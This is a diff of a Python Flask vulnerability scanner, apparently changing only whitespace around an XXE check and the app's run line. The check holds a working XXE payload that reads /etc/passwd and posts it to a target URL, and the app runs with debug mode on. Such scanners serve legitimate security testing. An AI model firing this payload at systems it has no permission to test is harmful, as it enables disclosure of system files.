@@ -109,10 +109,10 @@ def perform_directory_traversal_check(target_url):
     return "No Directory Traversal vulnerability detected."
 
 def perform_xxe_check(target_url):
-    xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
+    xxe_payload ="""  <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [ <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-    <foo>&xxe;</foo>"""
+    <foo>&xxe;</foo> """
     headers = {"Content-Type": "application/xml"}
     try:
         response = requests.post(target_url, data=xxe_payload, headers=headers)
@@ -177,4 +177,4 @@ def scan():
     return jsonify(results)
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(debug=True) 
